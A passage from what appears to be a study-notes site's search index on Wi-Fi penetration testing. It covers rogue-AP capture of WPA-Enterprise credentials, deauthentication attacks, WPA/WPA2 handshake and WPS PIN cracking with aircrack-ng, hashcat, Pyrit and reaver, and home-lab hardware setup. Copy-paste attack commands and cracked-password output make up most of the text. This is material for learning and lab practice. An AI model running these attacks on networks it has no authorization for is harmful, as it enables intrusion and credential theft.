phase2=\"auth=MSCHAPV2\"\n}\n\nwpa_supplicant -c wpa_supplicant.conf\n</code></pre> <pre><code>When a victim attempts to authenticate to our AP, the login attempt is captured.\n\n...\nwlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: authenticated\nwlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: associated (aid 1)\nwlan0: CTRL-EVENT-EAP-STARTED 00:2b:bb:b0:42:9e\nwlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1\nMANA EAP Identity Phase 0: cosmo\nwlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25\nMANA EAP Identity Phase 1: cosmo\nMANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4\nMANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::\nMANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c\n\nmethod=2511 tells us that the chosen authentication is PEAP, and the line below that one includes the username cosmo. These credentials are also in /tmp/hostapd.credout.\n\nWhen starting hostapd, we will append -B to run it in the background. The first few lines of hostapd will be displayed before it goes into the background, where it will continue to run until it successfully at creates the AP.\n\nWe will be using asleap to crack the password hash. We can copy/paste the output, starting with asleap, and append the wordlist /usr/share/john/password.lst to the -W parameter\n\nkali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst\nasleap 2.2 - actively recover LEAP/PPTP passwords. &lt;jwright@hasborg.com&gt;\nUsing wordlist mode with \"/usr/share/john/password.lst\".\n        hash bytes:        586c\n        NT hash:           8846f7eaee8fb117ad06bdd830b7586c\n        password:          password\n...\nWe recovered the password, password. Even if these credentials are not immediately useful to us, we'll make a note of them as they may be of use later in the pentest.\n\nIn a live scenario, it is likely the device will keep connecting and hostapd will keep showing challenge/responses.\n\nThere are a number of attack escalation opportunities at this point.\n\nA tool called crackapd12 can automatically run asleap when it sees credentials in the log file. If crackapd successfully recovers credentials, crackapd adds the user to hostapd eap_user file. This allows the user to successfully connect to our rogue AP.\n\nWe could also provide Internet access by adding a DHCP server and a few nftables rules to enable routing, though we won't describe that approach in detail here.\n\nWe could push the attack further and authenticate ourselves to the real AP. This, along with some different nftables rules, would provide the user access to the actual company network.\n\nIf clients don't connect to our rogue AP, we can use another wireless card and look for the clients connected to the legitimate APs with airodump-ng. We would then use aireplay-ng and keep deauthenticating them. They may eventually connect to our AP, except in cases when the configuration has been locked down or if the network uses 802.11w.\n</code></pre>"},{"location":"wireless/attacks/wpa/enterprise/#references","title":"References","text":"<ul> <li>Andrew Long</li> <li>Challenge Handshake Authentication Protocol (CHAP)</li> <li>Extensible Authentication Protocol (EAP)</li> <li>EAP PEAP Authentication Protocol EAP-TLS Authentication Protocol</li> <li>MS-CHAP</li> <li>Password Authentication Protocol (PAP)</li> <li>RADIUS</li> </ul>"},{"location":"wireless/attacks/wpa/hashcat/","title":"Hashcat (WPA/WPA2)","text":""},{"location":"wireless/attacks/wpa/hashcat/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least on client associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack to get four-way handshake\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for the four-way handshake to appear in airodump-ng window.\n\n# Stop it\nqq\n</code></pre>"},{"location":"wireless/attacks/wpa/hashcat/#hashcat-stuff","title":"Hashcat Stuff","text":"<pre><code># Show information about platform and processors\nhashcat -I\n\n# Get some help because it's needed :)\nhashcat --help\n\n# Do some benchmarking -- careful here\nhashcat -b -m 22000\n\n# Install utilities (usually already on Kali)\nsudo apt-get install hashcat-utils -y\nsudo apt-get install hcxpcapngtool -y\n\n# Convert PCAP to hash format understood by hashcat\nsudo hcxpcapngtool -o hash.hc22000 -E $WORDLIST $PCAP\n\n# Cat cracks hashes\nhashcat -m 22000 hash.hc22000 $WORDLIST\n\n# Computer starts screaming ...\n# Output\nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n==================================================================================================================================================\n* Device #1: pthread-sandybridge-11th Gen Intel(R) Core(TM) i7-11700K @ 3.60GHz, 1433/2930 MB (512 MB allocatable), 4MCU\n\nMinimum password length supported by kernel: 8\nMaximum password length supported by kernel: 63\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Single-Hash\n* Single-Salt\n* Slow-Hash-SIMD-LOOP\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 0 MB\n\nDictionary cache built:\n* Filename..: /usr/share/john/password.lst\n* Passwords.: 3561\n* Bytes.....: 26343\n* Keyspace..: 3561\n* Runtime...: 0 secs\n\nApproaching final keyspace - workload adjusted.\n\n6b05fe2fe4d6a8d9aa49d7761323e70b:009fa924b928:74da38ca5991:wifu:password123\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)\nHash.Target......: hash.hc22000\nTime.Started.....: Sat Jun 17 01:36:30 2023 (1 sec)\nTime.Estimated...: Sat Jun 17 01:36:31 2023 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/john/password.lst)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:     1829 H/s (5.16ms) @ Accel:128 Loops:512 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 3561/3561 (100.00%)\nRejected.........: 2921/3561 (82.03%)\nRestore.Point....: 2705/3561 (75.96%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: prometheus -&gt; password123\nHardware.Mon.#1..: Util: 26%\n\nStarted: Sat Jun 17 01:36:07 2023\nStopped: Sat Jun 17 01:36:31 2023\n</code></pre>"},{"location":"wireless/attacks/wpa/hashcat/#references","title":"References","text":"<ul> <li>Hashcat</li> <li>Hashcat Utilities</li> </ul>"},{"location":"wireless/attacks/wpa/john-the-ripper/","title":"John the Ripper (JtR) with Aircrack-ng (WPA/WPA2)","text":"<p>Use this tool to crack WPA/WPA2 passwords with aircrack-ng</p>"},{"location":"wireless/attacks/wpa/john-the-ripper/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least on client associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack to get four-way handshake\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for the four-way handshake to appear in airodump-ng window.\n\n# Stop airodump-ng when it appears\nqq\n\n# Crack the password using john\njohn --wordlist=$WORDLIST --rules --stdout | aircrack-ng -e $SSID $PCAP -w -\n\n# Try other wordlist or create custom rules (see below) if not finding\n</code></pre>"},{"location":"wireless/attacks/wpa/john-the-ripper/#customize-rules","title":"Customize Rules","text":"<p>We can create additional test cases by editing existing rules.</p> <pre><code># First, check what exists for a given password\njohn --wordlist=$WORDLIST --rules --stdout | grep -i password123\n</code></pre> <p></p> <pre><code># Now, add new rules\nsudo vi /etc/john/john.conf\n\n# Search for the List.Rules:Wordlist section\n# Add these rules under this section to append more numbers, e.g., password123\n$[0-9]$[0-9]\n$[0-9]$[0-9]$[0-9]\n\n# Save and try it out\njohn --wordlist=$WORDLIST --rules --stdout | grep -i password123\n</code></pre> <p></p>"},{"location":"wireless/attacks/wpa/john-the-ripper/#references","title":"References","text":"<ul> <li>/usr/share/john/password.lst ($WORDLIST)</li> <li>/usr/share/wordlists</li> <li>Aircrack-ng</li> <li>Aireplay-ng</li> <li>Airmon-ng</li> <li>Airodump-ng</li> <li>John the Ripper</li> </ul>"},{"location":"wireless/attacks/wpa/pyrit/","title":"Pyrit Attack (WPA/WPA2)","text":"<p>A GPGPU-driven WPA/WPA2-PSK key cracker</p> <p>Pyrit exploits the computational power of many-core- and GPGPU-platforms to create massive databases, pre-computing part of the WPA/WPA2-PSK authentication phase in a space-time tradeoff. It is a powerful attack against one of the world's most used security-protocols</p>"},{"location":"wireless/attacks/wpa/pyrit/#installation","title":"Installation","text":"<p>Pyrit is no longer installed on Kali by default. Also <code>apt install pyrit -y</code> does not work. Pyrit still uses Python2. One must do all of this to work:</p> <pre><code>cd\nsudo apt update -y\nsudo apt install git python2-dev libssl-dev libpcap-dev -y\ngit clone https://github.com/JPaulMora/Pyrit.git --depth=1\nsed -i \"s/COMPILE_AESNI/COMPILE_AESNIX/\" Pyrit/cpyrit/_cpyrit_cpu.c\ncd Pyrit\npython2 setup.py clean\npython2 setup.py build\nsudo python2 setup.py install\nwget https://codeload.github.com/secdev/scapy/zip/v2.3.2 -O /tmp/scapy.zip\ncd /tmp\nunzip scapy.zip\ncd scapy-2.3.2\nsudo python2 ./setup.py install\ncd ..\npyrit -h\npyrit list_cores\n</code></pre>"},{"location":"wireless/attacks/wpa/pyrit/#commands","title":"Commands","text":"<pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack to get four-way handshake\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for the four-way handshake to appear in airodump-ng window.\n\n# Stop airodump-ng when it appears\nqq\n</code></pre>"},{"location":"wireless/attacks/wpa/pyrit/#check-fourway-handshake","title":"Check Fourway Handshake","text":"<p><pre><code>pyrit -r $PCAP analyze\n</code></pre> </p>"},{"location":"wireless/attacks/wpa/pyrit/#strip-unneeded-data","title":"Strip Unneeded Data","text":"<p><pre><code>pyrit -r $PCAP -o $TAG-stripped.cap strip\n</code></pre> </p>"},{"location":"wireless/attacks/wpa/pyrit/#using-a-wordlist","title":"Using a Wordlist","text":"<p><pre><code># Unstripped\npyrit -r $PCAP -i $WORDLIST -b $BSSID attack_passthrough\n# OR Stripped\npyrit -r $TAG-stripped.cap -i $WORDLIST -b $BSSID attack_passthrough\n</code></pre> </p>"},{"location":"wireless/attacks/wpa/pyrit/#using-a-database","title":"Using a Database","text":"<pre><code># Crack the secret in database mode\npyrit -i $WORDLIST import_passwords\npassword in pyrit with database mode\npyrit -e &lt;ESSID&gt; create_essid\npoint to the pyrit database\npyrit batch\npyrit -r $CAPTURE -b $BSSID attack_db\n</code></pre>"},{"location":"wireless/attacks/wpa/pyrit/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Aireplay-ng</li> <li>Airmon-ng</li> <li>Airodump-ng</li> <li>GoLinuxCloud Install on Kali</li> <li>Pyrit GitHub</li> <li>Null Byte</li> </ul>"},{"location":"wireless/attacks/wpa/rsmangler/","title":"Rsmangler with Aircrack-ng (WPA/WPA2)","text":"<p>Use this tool to crack WPA/WPA2 passwords with aircrack-ng</p> <pre><code># Create a custom wordlist\necho 'donkey' &gt; wordlist.txt\necho 'burro' &gt;&gt; wordlist.txt\necho 'mule' &gt;&gt; wordlist.txt\necho 'ass' &gt;&gt; wordlist.txt\necho 'dumb' &gt;&gt; wordlist.txt\n\nrsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e $SSID $PCAP -w -\n</code></pre>"},{"location":"wireless/attacks/wpa/rsmangler/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Aireplay-ng</li> <li>Airmon-ng</li> <li>Airodump-ng</li> <li>Rsmangler</li> </ul>"},{"location":"wireless/attacks/wps/wps/","title":"WPS","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>AP must have WPS enabled using PIN here<ul> <li>For sake of time, just use <code>01235678</code></li> <li>This is the third guess and the guesses are not random</li> </ul> </li> <li>WPS version 1.0 (brute force)</li> <li>If WPS is <code>Lck==Yes</code>, then an attack is not possible</li> </ul> <p>Wash is an auxiliary tool designed to display WPS enabled Access Points and their main characteristics. Wash is included in the Reaver package.</p> <p>Reaver performs a brute force attack against an access point's WiFi Protected Setup pin number. Once the WPS pin is found, the WPA PSK can be recovered and alternately the AP's wireless settings can be reconfigured</p>"},{"location":"wireless/attacks/wps/wps/#commands","title":"Commands","text":"<p><pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Scan for APs with WPS -\nsudo wash -i $INTERFACE\n\n# Stop the scan\nctrl+c\n\n# Wait until INTERFACE appears with BSSID\nsudo reaver -b $BSSID -i $INTERFACE -v\n\n# THIS TAKES FOREVER AND EVEN IF PIN IS SET TO FIRST GUESS\n# DOES NOT WORK :( ON FRONTIER ROUTER ... WHICH IS WPS V1.0\n\n# Try with the PixieWPS option (FAST)\nsudo reaver -b $BSSID -i $INTERFACE -v -K\n</code></pre> * Worked quite fast on WPS v2.0 router, not at all on WPS v1.0 router</p> <p></p>"},{"location":"wireless/attacks/wps/wps/#airgeddon-reaver-bully","title":"Airgeddon / Reaver / Bully","text":"<p>Enable Network Manager</p> <pre><code>sudo systemctl start NetworkManager\nsudo apt install airgeddon -y\nsource /usr/share/airgeddon/known_pins.db\nsudo airmon-ng check kill\n\n# Some APs don't have a PIN ... used as blank\n# See if we can find a match first six HEX of AP MAC BSSID\n# Case-sensitive ... if pins are returned then try them\n# For example\necho ${PINDB[\"0013F7\"]}\n\n14755989 48703970 06017637\n\n# Then try each one\nsudo reaver -b $BSSID -i $INTERFACE -v -K -p 14755989\nsudo reaver -b $BSSID -i $INTERFACE -v -K -p 48703970\nsudo reaver -b $BSSID -i $INTERFACE -v -K -p 06017637\n</code></pre>"},{"location":"wireless/attacks/wps/wps/#bully","title":"Bully","text":"<ul> <li>Did not work</li> </ul> <pre><code>sudo bully -b $BSSID -c $CHANNEL -d -v 4  $INTERFACE\n</code></pre>"},{"location":"wireless/attacks/wps/wps/#references","title":"References","text":"<ul> <li>Wi-Fi Protected Setup</li> <li>Reaver GitHub</li> <li>Airgeddon</li> </ul>"},{"location":"wireless/hardware/actiontec-mI424wr-revI/","title":"Actiontec M1424wr Rev I Wireless Broadband Router","text":"<p>Lot's of them on E-Bay. Check GoodWill too.</p> <ul> <li>Connect to AP using default user name and password labeled on the device itself</li> <li>Log in to http://192.168.1.1</li> </ul>"},{"location":"wireless/hardware/hardware/","title":"Hardware","text":""},{"location":"wireless/hardware/hardware/#setup","title":"Setup","text":"<p>Here is a recommended homte lab environment:</p> <ul> <li>VMware image of Kali Linux</li> <li>Access point (AP) that supports WEP/WPA/WPA2<ul> <li>A pin to factory reset it</li> </ul> </li> <li>One or two wireless adapters that support monitor mode</li> <li>Any client with Wi-Fi capabilities</li> </ul> <p></p> <ul> <li>Note that the green stress ball is optional</li> </ul> <p></p>"},{"location":"wireless/hardware/hardware/#access-points","title":"Access Points","text":"<p>Finding a router with WEP capabilities is not easy these days and that is a good thing. Even old and used routers have updated firmware/software that lacks the WEP capability. It doesn't appear the new exam tests for WEP but not 100% sure. It's good to learn how to either way.</p> <p>Note: Check for old ISP routers to save money if still around at home. Most support WEP/WPA/WPA2.</p>"},{"location":"wireless/hardware/hardware/#tp-link-ac750-tl-wr902ac","title":"TP-Link AC750 (TL-WR902AC)","text":"<p>Best one. It's modern and still offers WEP/WPA/WPA2/WPA3 capabilities out of the box.</p> Name Value Model TP-Link AC750 Wireless Portable Nano Travel Router (TL-WR902AC) Docs User Guide Specs IEEE 802.11n/b/g 2.4 GHz, IEEE 802.11ac/n/a 5 GHz Power 20-23 dBm SSIDs TP-Link_18-E1, TP-Link_18E1_5G IP http://192.168.0.1 / http://tplinkwifi.net Security WEP/WPA/WPA2 HVIN HVIN:TL-WR902AC V3 <p></p>"},{"location":"wireless/hardware/hardware/#configuration","title":"Configuration","text":"<ul> <li>Connect to the AP using the PIN credentials found on the device via your computer's Wi-Fi</li> <li>Open a browser and navigate to http://192.168.0.1 via a browser</li> <li>Change SSID to <code>wifu</code> under <code>Wireless 2.4Ghz -&gt; Basic Settings -&gt; Wireless Network Name</code></li> <li>Disable WPS (You will need to do this or the choose  WEP option will not appear)</li> <li>Go to <code>Wireless 2.4 GHz -&gt; WPS</code></li> <li>Click on the <code>Disable</code> button</li> </ul> <ul> <li>Wait for the router to reboot. It will happen automatically without a prompt. You may need to reconnect/reauthenticate with the PIN if you did not select <code>Connect automatically</code></li> <li>Verify that WPS is disabled</li> </ul> <ul> <li>Go to <code>Wireless 2.4GHz -&gt; Wireless Security</code></li> <li>Select the <code>WEP</code> option</li> </ul> <ul> <li>Set WEP key  accordingly</li> <li>64-bit: Enter 10 hexadecimal digits (any combination of 0-9, a-f, A-F, zero key is not permitted) or 5 ASCII characters, e.g., <code>aabbccddee</code> or <code>pizza</code></li> <li>128-bit: Enter 26 hexadecimal digits (any combination of 0-9, a-f, A-F, zero key is not permitted) or 13 ASCII characters.</li> <li>152-bit: Enter 32 hexadecimal digits (any combination of 0-9, a-f, A-F, zero key is not permitted) or 16 ASCII characters.</li> </ul>"},{"location":"wireless/hardware/hardware/#wireless-adapters","title":"Wireless Adapters","text":""},{"location":"wireless/hardware/hardware/#alfa-awus036nha","title":"ALFA AWUS036NHA","text":"<p>Only one is needed but having two is nice to have for creating a secondary access point and for doing advanced adapter to adapter injection testing using <code>aireplay-ng --test ...</code>.</p> Name (A1) Value Model ALFA AWUS036NHA Chipset Atheros AR9271 Frequency 2.GHz Spec IEEE 802.11 b/g/n Power 5 dBi Linux Driver https://github.com/aircrack-ng/rtl8812au <p></p>"},{"location":"wireless/hardware/hardware/#driver-installation","title":"Driver Installation","text":"<pre><code>sudo apt update\nsudo apt upgrade -y\nsudo apt dist-upgrade -y\nsudo reboot now\n\nsudo apt-get install -y linux-headers-$(uname -r)\nsudo apt-get install -y realtek-rtl88xxau-dkms dkms\ngit clone https://github.com/aircrack-ng/rtl8812au\ncd rtl8812au\nmake\nsudo make install\n</code></pre>"},{"location":"wireless/hardware/hardware/#troubleshooting","title":"Troubleshooting","text":"<ul> <li>Testing is done in a Kali Linux VM. Start the VM then connect the adapter. Wait for the prompt from the VM software asking whether to connect to the host or guest. Choose the latter. Do this for each adapter. Starting the VM with the adapter connect does not always work. Sometimes a full host reboot is required (see below) if this doesn't work.</li> <li>Sometimes the device becomes unresponsive when connected to a VM over long periods of inactivity. Unplug the device and restart the VM. The green light should start to flash blue.</li> </ul>"},{"location":"wireless/hardware/hardware/#clientsstations","title":"Clients/Stations","text":"<p>Anything with Wi-Fi capabilities will do with a few caveats:</p> <ul> <li>WEP - Some devices might not support it anymore.</li> <li>Don't wire your device to your normal LAN in case it gets attacked not by you.</li> </ul>"},{"location":"wireless/hardware/hardware/#raspberry-pi-wi-fi","title":"Raspberry Pi (Wi-Fi)","text":"<p>A Raspberry Pi with Wi-Fi capabilities is a great client to attack when connected to a target AP.</p> <ul> <li>An old Raspberry Pi Model B worked just fine</li> </ul> <p><pre><code>cat /proc/cpuinfo\n</code></pre> </p> <ul> <li>Connect a Wi-Fi USB adapter if Wi-Fi is not already on board</li> <li>Make note of the Wi-Fi BSSID with the <code>ifconfig</code> or <code>ip -a</code> command</li> <li>Connect to the vulnerable AP with weak password</li> </ul> <p></p>"},{"location":"wireless/software/aircrack-ng/","title":"Aircrack-ng","text":"<p>Aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program.</p>"},{"location":"wireless/software/aircrack-ng/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> </ul>"},{"location":"wireless/software/aircrack-ng/#wep","title":"WEP","text":"<p>Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part of the aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW approach (Pyshkin, Tews, Weinmann). The default cracking method is PTW. This is done in two phases. In the first phase, aircrack-ng only uses ARP packets. If the key is not found, then it uses all the packets in the capture. Please remember that not all packets can be used for the PTW method. This Tutorial: Packets Supported for the PTW Attack page provides details. An important limitation is that the PTW attack currently can only crack 40 and 104 bit WEP keys. The main advantage of the PTW approach is that very few data packets are required to crack the WEP key.</p>"},{"location":"wireless/software/aircrack-ng/#wpawpa2","title":"WPA/WPA2","text":"<p>For cracking WPA/WPA2 pre-shared keys, only a dictionary method is used. A \u201cfour-way handshake\u201d is required as input. For WPA handshakes, a full handshake is composed of four packets. However, aircrack-ng is able to work successfully with just 2 packets. EAPOL packets (2 and 3) or packets (3 and 4) are considered a full handshake.</p> <pre><code># Crack the key using a wordlist\nsudo aircrack-ng -w $WORDLIST -b $BSSID -e $SSID $PCAP\n\n# Crack the key with using a database\naircrack-ng -r $DB $PCAP\n\n# Add colorful display\naircrack-ng -0 $PCAP\n\n# Crack a 64-bit WEP key using PTW attack\naircrack-ng -0 -z -n 64 $PCAP\n\n# Run benchmark (~15s) to see how many passphrases can be cracked per second\naircrack-ng -S\n</code></pre>"},{"location":"wireless/software/aircrack-ng/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>GitHub</li> </ul>"},{"location":"wireless/software/airdecap-ng/","title":"airdecap-ng","text":"<p>Decrypts WEP/WPA/WPA2 capture files and can be used to filter for a specific BSSID.</p>"},{"location":"wireless/software/airdecap-ng/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> </ul> <pre><code># Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n# Connect a few clients and do some HTTP via browser\n\n# Stop\nqq\n\n# Look at encrypted data in wireshark\nsudo wireshark $PCAP\n</code></pre> <pre><code># Decrypt with cracked key (already known)\nsudo airdecap-ng -l -p password123 -e $SSID $PCAP\n</code></pre> <pre><code># Look at the decrypted data\nsudo wireshark $TAG-01-dec.cap\n</code></pre> <pre><code># Strip headers from unencrypted capture\nsudo airdecap-ng -b $BSSID $PCAP\n\n# Look at the much smaller file\nsudo wireshark $PCAP\n</code></pre>"},{"location":"wireless/software/airdecap-ng/#references","title":"References","text":"<ul> <li>Airodecap-ng</li> </ul>"},{"location":"wireless/software/aireplay-ng/","title":"aireplay-ng","text":"<p>Used to inject/replay frames. The primary function is to generate traffic for later use in aircrack-ng for cracking the WEP and WPA-PSK keys. For example, looking for the four-way handshake message during a deauthentication injection tests. Make sure that both the BSSID and CHANNEL are set correctly prior to injections.</p> <p>Here's the normal workflow.</p> <ul> <li>Run setup first</li> </ul> <pre><code>sudo airmon-ng -c $CHANNEL $ADAPTER\n\n# Terminal 1\nsudo airodump-ng -c $CHANNEL --bssid $BSSID --output-format pcap -w $TAG $INTERFACE\n\n# Terminal 2\nsudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for found handshake message from airodump-ng then stop everything\n\n# Crack the key\nsudo aircrack-ng -w $WORDLIST -b $BSSID -e $SSID $PCAP\n</code></pre>"},{"location":"wireless/software/aireplay-ng/#commands","title":"Commands","text":"<pre><code># Test if injection works for given interface\nsudo aireplay-ng --test $INTERFACE\n\n# Test injection between two interfaces (if two exists)\nsudo aireplay-ng --test -i $INTERFACE2 $INTERFACE\n\n# Test injection in a specific AP\nsudo aireplay-ng -e $SSID -a $BSSID $INTERFACE\n\n# Test injection in a specific AP without expecting to receive probes\nsudo aireplay-ng -e $SSID -a $BSSID -D $INTERFACE\n\n# Deauthenticate a specific client connected to an AP\nsudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE\n\n# Deauthenticate ALL clients connected to an AP\nsudo aireplay-ng --deauth 7 -a $BSSID $INTERFACE\n</code></pre>"},{"location":"wireless/software/aireplay-ng/#attack-modes","title":"Attack Modes","text":"<pre><code>aireplay-ng --help\n\nAttack modes (numbers can still be used):\n\n    --deauth      count : deauthenticate 1 or all stations (-0)\n--fakeauth    delay : fake authentication with AP (-1)\n--interactive       : interactive frame selection (-2)\n--arpreplay         : standard ARP-request replay (-3)\n--chopchop          : decrypt/chopchop WEP packet (-4)\n--fragment          : generates valid keystream   (-5)\n--caffe-latte       : query a client for new IVs  (-6)\n--cfrag             : fragments against a client  (-7)\n--migmode           : attacks WPA migration mode  (-8)\n--test              : tests injection and quality (-9)\n</code></pre>"},{"location":"wireless/software/aireplay-ng/#references","title":"References","text":"<ul> <li>Aireplay-ng</li> </ul>"},{"location":"wireless/software/airgraph-ng/","title":"airgraph-ng.md","text":""},{"location":"wireless/software/airgraph-ng/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> </ul> <pre><code># Capture some packets\nsudo airodump-ng -a --bssid $BSSID -c $CHANNEL -w $TAG $ADAPTER\n\n# Generate a Client to AP Relationship (CAPR) graph\nairgraph-ng -o $TAG-capr.png -i $PCAP -g CAPR\n\n# Display it\neog $TAG-capr.png\n\n# Generate a Client Probe Graph (CPG) that displays the relationship between clients and probed networks\nairgraph-ng -o $TAG-cpg.png -i $TAG-01.csv -g CPG\n\n# Display it\neog $TAG-cpg.png\n</code></pre>"},{"location":"wireless/software/airgraph-ng/#references","title":"References","text":"<ul> <li>[Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airgraph-ng](https://www.aircrack-ng.org/doku.php?id=airgraph-ng)</li> </ul>"},{"location":"wireless/software/airmon-ng/","title":"airmon-ng","text":"<p>Used to enable monitor mode on wireless interfaces. It may also be used to kill network managers, or go back from monitor mode to managed mode. Entering the airmon-ng command without parameters will show the interfaces status.</p>"},{"location":"wireless/software/airmon-ng/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> </ul> <pre><code># List the available interfaces\nsudo airmon-ng\n\n# List programs that could interfere with aircrack tools\nsudo airmon-ng check\n\n# Kill the programs that could interfere with aircrack tools\nsudo airmon-ng check kill\n# To regain later\nsudo service NetworkManager start\n\n# Start interface in monitor mode\nsudo airmon-ng start $ADAPTER\n# OR\nifconfig mon0 down\nifconfig mon0 mode managed\nifconfig mon0 up\n\n# Start interface in monitor mode and channel is set\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Set interface to a specific channel even if running\nsudo iw dev $ADAPTER set channel $CHANNEL\n\n# Verify that channel is set correctly\nsudo iw dev $INTERFACE info\niwconfig $INTERFACE\n\n# Stop monitor mode on the given interface\nsudo airmon-ng stop $INTERFACE\n\n# Run in debug mode\nsudo airmon-ng --debug\n\n# Run in verbose mode\nsudo airmon-ng --verbose\n</code></pre>"},{"location":"wireless/software/airmon-ng/#references","title":"References","text":"<ul> <li>Airmon-ng</li> </ul>"},{"location":"wireless/software/airodump-ng/","title":"airodump-ng","text":"<p>Used for capturing raw 802.11 frames. It is particularly suitable for collecting WEP IVs and WPA handshakes for the intent of using them with aircrack-ng. If you have a GPS receiver connected to the computer, airodump-ng is capable of logging the coordinates of the found access points.</p>"},{"location":"wireless/software/airodump-ng/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> </ul> <pre><code># Capture all traffic on all channels\nsudo airodump-ng $INTERFACE\n\n# Capture traffic filtered by given channel/BSSID\nsudo airodump-ng -c 3 --bssid $BSSID $INTERFACE\n\n# Capture traffic filtered by given channel/BSSID and save to PCAP file\nsudo airodump-ng -c $CHANNEL --bssid $BSSID --output-format pcap -w $TAG $INTERFACE\n\n# Capture traffic filtered by given channel and ESSID\nsudo airodump-ng -c 3 --essid $SSID $INTERFACE\n\n# Scan 2.4/5 GHz simultaneously\nsudo airodump-ng --band abg $INTERFACE\n\n# Load capture file in airodump-ng\nsudo airodump-ng -r $PCAP\n\n# Load capture file in Wireshark\nwireshark $PCAP\n</code></pre>"},{"location":"wireless/software/airodump-ng/#references","title":"References","text":"<ul> <li>Airodump-ng</li> </ul>"},{"location":"wireless/software/airolib-ng/","title":"Airolib-ng","text":""},{"location":"wireless/software/airolib-ng/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> </ul> <pre><code># Create list of one or more SSIDs\necho $SSID &gt; $SSID.txt\n\n# Import that list into a new airolib-ng database\nairolib-ng $SSID.sqlite --import essid $SSID.txt\n\n# Query the imported list\nairolib-ng $SSID.sqlite --stats\n\n# Import John's password WORDLIST\nairolib-ng $SSID.sqlite --import passwd $WORDLIST\n\n# Batch process the WORDLIST for each SSID\nairolib-ng wifu.sqlite --batch\n\n# Query the results\nairolib-ng wifu.sqlite --stats\n\n# Krakatoa the password\naircrack-ng -r $SSID.sqlite $PCAP\n</code></pre>"},{"location":"wireless/software/airolib-ng/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Airolib-ng</li> </ul>"},{"location":"wireless/software/bettercap/","title":"Bettercap","text":"<p>bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking 